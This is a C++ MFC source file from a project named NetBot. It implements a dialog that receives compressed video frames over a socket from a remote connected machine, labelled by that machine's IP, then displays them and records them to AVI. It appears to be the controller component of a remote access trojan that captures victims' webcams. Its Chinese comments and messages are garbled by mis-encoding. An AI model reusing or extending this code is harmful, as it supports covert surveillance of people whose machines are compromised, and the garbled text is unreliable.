// VideoDlg.cpp : implementation file
//

#include "stdafx.h"
#include "NetBot.h"
#include "VideoDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CVideoDlg dialog


CVideoDlg::CVideoDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CVideoDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CVideoDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	m_ConnSocket = INVALID_SOCKET;
	m_bStop = FALSE;
	m_pAviFile = NULL;
}


void CVideoDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CVideoDlg)
	DDX_Control(pDX, IDC_PROGRESS_VIDEO, m_Progress);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CVideoDlg, CDialog)
	//{{AFX_MSG_MAP(CVideoDlg)
	ON_WM_SIZE()
	ON_BN_CLICKED(IDC_BTN_RECORDS, OnBtnRecords)
	ON_BN_CLICKED(IDC_BTN_RECORDE, OnBtnRecorde)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CVideoDlg message handlers
void CVideoDlg::SetConnSocket(SOCKET socket)
{
	m_ConnSocket = socket;

		sockaddr_in addr;
	int cb = sizeof(addr);
	int ir = getpeername(m_ConnSocket, (sockaddr*)&addr, &cb);
	CString OnlineIP;
	OnlineIP.Format("%s:%d",inet_ntoa(addr.sin_addr),ntohs(addr.sin_port));//ntohs������u_longתint

	SetWindowText("[��Ƶ��׽] "+OnlineIP);

	VideoStart();
}

void CVideoDlg::StatusTextOut(int iPane,LPCTSTR ptzFormat, ...)
{
	TCHAR tzText[1024];

	va_list vlArgs;
	va_start(vlArgs, ptzFormat);
	wvsprintf(tzText, ptzFormat, vlArgs);
	va_end(vlArgs);

	m_wndStatusBar.SetText(tzText, iPane, 0);
}

BOOL CVideoDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	// Set the small icon for this dialog
	SetIcon(AfxGetApp()->LoadIcon(IDI_LIST_VIDEO), FALSE);	
	CenterWindow();	
	// TODO: Add extra initialization here
	//create statusbar=============================
	m_wndStatusBar.Create(WS_CHILD|WS_VISIBLE|CCS_BOTTOM,  CRect(0,0,0,0),  this,  0x1300001);
	int strPartDim[2]= {250,-1};
	m_wndStatusBar.SetParts(2,strPartDim);

	//create picture box
	m_PicBox.Create(NULL, NULL, WS_VISIBLE | WS_CHILD | WS_BORDER | WS_HSCROLL | WS_VSCROLL, CRect(0, 0, 1, 1), this, 0);
	CRect rc;
	GetClientRect(&rc);
	rc.bottom -= 50;
	m_PicBox.MoveWindow(&rc);
	m_PicBox.SetTipText("���Ժ��豸���ڳ�ʼ������");

	return TRUE;
}

void CVideoDlg::OnCancel() 
{
	// TODO: Add extra cleanup here
	if(m_pAviFile != NULL)
		delete m_pAviFile;
	m_pAviFile = NULL;

	m_bStop = TRUE;
	VideoStop();

	//��ģʽ�Ի�����Ҫ�������ٶԻ���
	DestroyWindow();
//	CDialog::OnCancel();
}

void CVideoDlg::PostNcDestroy() 
{
	// TODO: Add your specialized code here and/or call the base class
	delete this;	
	CDialog::PostNcDestroy();
}

BOOL CVideoDlg::PreTranslateMessage(MSG* pMsg) 
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN)   
	{   
		int nVirtKey = (int)pMsg->wParam;           
		if (nVirtKey == VK_RETURN)   
		{   
			//����ǻس�����������Ҫ��������,����ʲôҲ����   
			return TRUE;   
		}   
		if (nVirtKey == VK_ESCAPE)   
		{   
			//�����ESC����������Ҫ��������,����ʲôҲ����
			return TRUE;   
		}   
	}  
	
	return CDialog::PreTranslateMessage(pMsg);
}

void CVideoDlg::OnSize(UINT nType, int cx, int cy) 
{
	CDialog::OnSize(nType, cx, cy);
	
	// TODO: Add your message handler code here
	if( m_PicBox.m_hWnd == NULL)
		return;

	CRect rc;
	GetClientRect(&rc);
	rc.bottom -= 50;
	m_PicBox.MoveWindow(&rc);
}

DWORD CVideoDlg::RecvVideo() 
{
	MsgHead msgHead;
	char chBuffer[256];
	//send socket type 
	if(!RecvMsg(m_ConnSocket, chBuffer, &msgHead))
	{
		MessageBox("��������ʧ��","��ʾ");
		closesocket(m_ConnSocket);
		return 0;//send socket type error
	}
		
	//��������
	switch(msgHead.dwCmd)
	{
	case 0:
		break;
	case 1:
		{
			MessageBox("�豸�����ڻ���������ռ��","��ʾ");
			PostMessage(WM_COMMAND, IDCANCEL); 
			return 0;
		}
		break;
	case 2:
		{
			MessageBox("��Ƶ�豸��ʼ��ʧ��","��ʾ");
			PostMessage(WM_COMMAND, IDCANCEL); 
			return 0;
		}
		break;
	default:
		{
			MessageBox("δ֪����","��ʾ");
			PostMessage(WM_COMMAND, IDCANCEL); 
			return 0;
		}
		break;
	}

	LPBITMAPINFO pBmpheader = LPBITMAPINFO(chBuffer);
	while(!m_bStop)
	{
		if(recv( m_ConnSocket,(char*)&msgHead,sizeof(MsgHead),0) >0)
		{
			BYTE* pCompress = new BYTE [msgHead.dwExtend2];
			BYTE* pUnCompress = new BYTE[msgHead.dwExtend1]; 
			//����֡����ʵ�ʳ��Ƚ��ܸ�֡����

			//int iRecvLen = 0,iRecved;
			ULONG iRecvLen = 0,iRecved;

			m_Progress.SetRange(0, (short)msgHead.dwSize);//������
			while (iRecvLen < msgHead.dwSize)
			{
				if( (msgHead.dwSize - iRecvLen) >=  BUFFER_MAXLEN)
				{
					iRecved = recv(m_ConnSocket,(char*)pCompress + iRecvLen, BUFFER_MAXLEN,0);
					if( iRecved == SOCKET_ERROR)
					{
						closesocket(m_ConnSocket);
						break;
					}
				}
				else
				{
					iRecved = recv(m_ConnSocket,(char*)pCompress + iRecvLen, msgHead.dwSize - iRecvLen,0);
					if( iRecved == SOCKET_ERROR)
					{
						closesocket(m_ConnSocket);
						break;
					}
				}
				iRecvLen += iRecved;
				m_Progress.SetPos(iRecvLen);
			}
			/////////////////////////////////////////////
			DWORD lenthUncompress = msgHead.dwExtend1;
			uncompress(pUnCompress,
					&lenthUncompress,
					pCompress,
					msgHead.dwExtend2);
			
			//��ʾͼ��
			HBITMAP hBitmap = GetBitmapFromData(pBmpheader, pUnCompress);
			if(m_pAviFile != NULL)
				m_pAviFile->AppendNewFrame(hBitmap);
			m_PicBox.SetBitmap(hBitmap);
			StatusTextOut(1,_T("�ѽ��� %d ֡"), msgHead.dwCmd+1);

			delete [] pCompress;
			delete [] pUnCompress;

			::Sleep(1);
		}
	}
	///////////////////////////

	return 1;
}

DWORD CVideoDlg::RecvVideoThread(void* pThis)
{
	return ((CVideoDlg *)pThis)->RecvVideo();
}

BOOL CVideoDlg::VideoStart()
{
	//���������߳�
	hRecvVideoThread = CreateThread(NULL,
								  0,
								  (LPTHREAD_START_ROUTINE)RecvVideoThread,
								  this,
								  0,
								  NULL);
	if (hRecvVideoThread == NULL)
		return FALSE;
	else
		return TRUE;
}

void CVideoDlg::VideoStop()
{	
	//�ر�socket
	shutdown(m_ConnSocket,0x02);
	closesocket(m_ConnSocket);	
	//�����߳�
	DWORD dwExitCode;
	if(hRecvVideoThread != NULL)
	{
		WaitForSingleObject(hRecvVideoThread,200);
		if(GetExitCodeThread(hRecvVideoThread,&dwExitCode))
		{
			if(dwExitCode==STILL_ACTIVE)
			{
				TerminateThread(hRecvVideoThread,dwExitCode);
			}
		}
		hRecvVideoThread = NULL;
	}
}

HBITMAP CVideoDlg::GetBitmapFromData(LPBITMAPINFO lpBmpInfo, BYTE* pDibData)
{
	HBITMAP hBitmap;

	HDC hDC = CreateDC("DISPLAY", NULL, NULL, NULL);
	// ����DDBλͼ
	hBitmap = CreateDIBitmap(
		      hDC,
			  &lpBmpInfo->bmiHeader,
			  CBM_INIT,
			  pDibData,
			  lpBmpInfo,
			  DIB_RGB_COLORS) ;

	DeleteDC(hDC);

	return hBitmap;
}

void CVideoDlg::OnBtnRecords() 
{
	// TODO: Add your control notification handler code here
	CString strAVIFile,strAVIName;
	CFileDialog dlgFileOpen(FALSE,".avi",NULL,OFN_HIDEREADONLY,"AVI Files(*.avi)|*.avi||");
	if(dlgFileOpen.DoModal() != IDOK)
		return;
	strAVIFile = dlgFileOpen.GetPathName();	
	strAVIName = dlgFileOpen.GetFileName();

	if(strAVIFile.IsEmpty())
	{
		MessageBox(_T("¼���ļ����Ʋ���Ϊ��,��ʼ¼��ʧ��"),_T("��ʼ¼��"),MB_ICONEXCLAMATION | MB_ICONERROR);
		return;
	}


	if(m_pAviFile != NULL)
		delete m_pAviFile;
	m_pAviFile = new CAviFile(strAVIFile, 0, 5);
	if(!m_pAviFile)
	{
		MessageBox(_T("�½���Ƶ¼���ļ�ʧ��"),_T("��ʼ¼��"),MB_ICONEXCLAMATION | MB_ICONERROR);
	}
	else
	{
		StatusTextOut(0,_T("¼��Ϊ�ļ� %s"), strAVIName);
		GetDlgItem(IDC_BTN_RECORDS)->EnableWindow(FALSE);
		GetDlgItem(IDC_BTN_RECORDE)->EnableWindow(TRUE);
	}
}

void CVideoDlg::OnBtnRecorde() 
{
	// TODO: Add your control notification handler code here
	if(m_pAviFile != NULL)
		delete m_pAviFile;
	m_pAviFile = NULL;

	StatusTextOut(0,_T(""));
	GetDlgItem(IDC_BTN_RECORDS)->EnableWindow(TRUE);
	GetDlgItem(IDC_BTN_RECORDE)->EnableWindow(FALSE);	
}
